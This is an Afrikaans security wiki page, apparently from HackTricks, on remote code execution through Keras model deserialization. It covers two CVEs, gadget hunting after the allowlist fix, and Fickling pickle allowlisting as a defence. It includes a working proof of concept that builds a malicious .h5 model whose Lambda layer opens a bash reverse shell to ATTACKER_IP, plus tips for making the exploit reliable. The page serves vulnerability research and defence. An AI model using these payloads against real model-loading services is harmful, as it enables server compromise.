# Keras Model Deserialization RCE en Gadget Hunting

Hierdie bladsy som praktiese exploitation-tegnieke teen die Keras model deserialization pipeline op, verduidelik die interne werking en attack surface van die native .keras-formaat, en verskaf 'n researcher toolkit om Model File Vulnerabilities (MFVs) en post-fix gadgets te vind.

## Interne werking van die .keras-modelformaat

'n .keras-lêer is 'n ZIP-argief wat ten minste die volgende bevat:<sup>[[1]](#references)</sup>
- metadata.json – algemene inligting (bv. Keras-weergawe)
- config.json – model-argitektuur (primêre attack surface)
- model.weights.h5 – gewigte in HDF5

Die config.json dryf recursive deserialization aan: Keras importeer modules, resolve classes/functions en rekonstrueer layers/objects vanaf attacker-controlled dictionaries.<sup>[[1]](#references)</sup>

Voorbeeldsnippie vir 'n Dense layer-object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization voer die volgende uit:<sup>[[1]](#references)</sup>
- Module-import en simboolresolusie vanaf die module/class_name-sleutels
- from_config(...) of constructor-aanroeping met aanvaller-beheerde kwargs
- Rekursie in geneste objekte (activations, initializers, constraints, ens.)

Histories het dit drie primitives blootgestel aan ’n aanvaller wat config.json saamstel:<sup>[[1]](#references)</sup>
- Beheer oor watter modules ingevoer word
- Beheer oor watter klasse/funksies opgelos word
- Beheer oor kwargs wat aan constructors/from_config deurgegee word

## CVE-2024-3660 – Lambda-layer bytecode RCE

Oorsaak:
- Legacy Lambda-deserialization het ’n Python-funksie uit aanvaller-beheerde marshaled code gerekonstrueer: `func_load()` base64-dekodeer die payload, roep `marshal.loads()` aan en skep ’n `FunctionType`. Die gevolglike funksie se bytecode loop wanneer die Lambda aangeroep word, en geaffekteerde laaiers voor 2.13 het nie safe-mode-kontroles vir legacy-formate afgedwing nie.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

In ’n native Keras v3-argief word die Lambda-funksie voorgestel as ’n `__lambda__`-objek waarvan die `code`-veld base64-geënkodeerde marshaled code bevat:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Versagting:
- Keras dwing `safe_mode=True` by verstek af vir die native Keras v3-formaat. Serialized Python lambdas in `Lambda` word geblokkeer tensy ’n gebruiker eksplisiet met `safe_mode=False` daarvan afsien; hierdie beskerming dek legacy-formate nie op dieselfde manier nie.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notas:
- Legacy-formate (ouer HDF5 saves) of ouer codebases dwing moontlik nie moderne checks af nie, dus kan “downgrade”-styl attacks steeds van toepassing wees wanneer slagoffers ouer loaders gebruik.

## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x

Oorsaak:
- `_retrieve_class_or_fn` het `importlib.import_module(module)` gebruik op attacker-controlled module strings uit `config.json`.
- Impak: ’n Crafted `.keras` archive kon veroorsaak dat `Model.load_model()` attacker-selected Python modules en functions importeer, met side effects tydens import en attacker-controlled arguments, selfs met `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit-idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sekuriteitsverbeterings (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module-allowlist: imports word beperk tot amptelike ekosisteemmodules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode as verstek: safe_mode=True blokkeer die laai van onveilige Lambda-geserialiseerde funksies
- Basiese tipekontrolering: gedeserialiseerde objekte moet met die verwagte tipes ooreenstem

## Praktiese uitbuiting: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras-deployments aanvaar moontlik steeds HDF5-modelle (`.h5`). As ’n aanvaller ’n model kan oplaai wat die server later laai of waarop dit inference uitvoer, kan ’n kwesbare loader ’n Lambda-laag deserialiseer wat aanvaller-beheerde Python bevat, wat dan in die toepassing se model-workflow kan uitvoer.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimale PoC om ’n kwaadwillige .h5 te skep waarvan die Lambda ’n reverse shell uitvoer wanneer die teiken die model invoke:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas en betroubaarheidswenke:
- Trigger points verskil volgens format en workflow; die verwysde write-up het waargeneem dat die payload twee keer tydens prediction uitgevoer word. Behandel side effects as herhaalbaar en maak payloads idempotent.<sup>[[7]](#references)</sup>
- Version pinning: stem die slagoffer se TF/Keras/Python ooreen om serialization mismatches te vermy. Bou byvoorbeeld artifacts onder Python 3.8 met TensorFlow 2.13.1 as dit is wat die target gebruik.<sup>[[7]](#references)</sup>
- Vinnige environment-replikasie:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validasie: ’n onskadelike payload soos os.system("ping -c 1 YOUR_IP") help om uitvoering te bevestig (bv. deur ICMP met tcpdump waar te neem) voordat na ’n reverse shell oorgeskakel word.<sup>[[7]](#references)</sup>

## Gadget-oppervlak ná die fix binne allowlist

Selfs met die Keras-module-allowlist en safe mode kan toegelate callables side effects blootstel. Byvoorbeeld, `keras.utils.get_file` laai ’n URL af en skryf dit onder die gekonfigureerde cache-ligging, wat dit ’n kandidaat vir gadget-analise maak.<sup>[[1]](#references)[[19]](#references)</sup>

Kandidaat Lambda-konfigurasie (valideer die call signature in ’n beheerde toets):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Belangrike beperking:
- `Lambda.call()` always passes the model input as the first positional argument and the configured `arguments` as keyword arguments. For `get_file`, that positional value fills `fname`; a tensor/path mismatch can make this candidate fail before any download, so it is not a guaranteed working gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting for AI/ML-modelle (Fickling)

Baie AI/ML-modelformate (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts, en ander Python-native formate) sluit Python pickle-data in. Die legacy Keras Lambda-pad hierbo gebruik eerder gemarshallede funksie-bytecode, dus is dit ’n afsonderlike deserialiseringsrisiko. Pickle-opcodes kan aanvallerbeheerde gedrag tydens deserialisering uitvoer, insluitend modeltampering of RCE, en eenvoudige scanners kan nuwe of ongelyste gevaarlike imports mis.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

’n Praktiese fail-closed-verdediging is om Python se pickle-deserializer te hook en slegs ’n hersiene stel skadelose ML-verwante imports tydens unpickling toe te laat. Trail of Bits se Fickling implementeer hierdie beleid en verskaf ’n saamgestelde ML-import-allowlist wat uit duisende publieke Hugging Face-pickles opgebou is.<sup>[[8]](#references)[[13]](#references)</sup>

Sekuriteitsmodel vir “veilige” imports (insigte wat uit navorsing en praktyk afgelei is): simbole wat deur ’n pickle gebruik word, moet gelyktydig:<sup>[[8]](#references)</sup>
- Nie code uitvoer of uitvoering veroorsaak nie (geen saamgestelde/broncode-objects, geen shelling out, hooks, ens.)
- Nie arbitrêre attributes of items kry of stel nie
- Nie ander Python-objects vanuit die pickle VM importeer of verwysings daarna verkry nie
- Geen sekondêre deserializers aktiveer nie (bv. marshal, geneste pickle), selfs nie indirek nie

Aktiveer Fickling se beskerming so vroeg as moontlik tydens process startup sodat enige pickle loads wat deur frameworks uitgevoer word (torch.load, joblib.load, ens.) nagegaan word:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasionele wenke:
- Jy kan die hooks tydelik deaktiveer/heraktiveer waar nodig:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- As ’n bekende-goeie model geblokkeer word, brei die allowlist vir jou omgewing uit nadat jy die simbole nagegaan het:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling stel ook generiese runtime guards bloot indien jy meer gedetailleerde beheer verkies:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() om checks vir alle pickle.load() af te dwing
- with fickling.check_safety(): vir afgebakende afdwinging
- fickling.load(path) / fickling.is_likely_safe(path) vir eenmalige checks

- Verkies nie-pickle-modelformate waar moontlik (bv. SafeTensors).<sup>[[15]](#references)</sup> Indien jy pickle moet aanvaar, laat loop loaders met least privilege, sonder network egress, en dwing die allowlist af.

Hierdie allowlist-first-strategie blokkeer aantoonbaar algemene ML-pickle-exploitpaaie terwyl dit hoë compatibility behou. In ToB se benchmark het Fickling 100% van sintetiese malicious files gemerk en ongeveer 99% van skoon files uit top Hugging Face-repos toegelaat.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) Sistematiese gadget discovery in toegelate modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direkte deserialiseringstoetsing (geen .keras-argief benodig nie)

Voer vervaardigde dicts direk aan Keras-deserialiseerders toe om te leer watter params aanvaar word en newe-effekte waar te neem.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing en formate

Keras bestaan in verskeie codebases/eras met verskillende guardrails en formate:<sup>[[1]](#references)</sup>
- TensorFlow ingeboude Keras: tensorflow/python/keras (legacy, geskeduleer vir verwydering)
- tf-keras: afsonderlik onderhou
- Multi-backend Keras 3 (amptelik): native .keras bekendgestel

Herhaal toetse oor codebases en formate (.keras teenoor legacy HDF5) om regressies of ontbrekende guardrails te ontdek.

## References

- [1] [Soek na kwesbaarhede in Keras Model Deserialization (huntr-blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Kontroles by serialisering gevoeg](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda-deserialisering RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras-arbitrêre module-import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr-verslag – arbitrêre import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr-verslag – arbitrêre import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE na root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits-blog – Fickling se nuwe AI/ML pickle-lêerskandeerder](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Beveiliging van AI/ML-omgewings (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle-skandering-benchmarkkorpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Agtergrond oor Sleepy Pickle-aanvalle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors-projek](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers laat arbitrêre kode-inspuiting toe](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer-bronkode (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities-bronkode (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
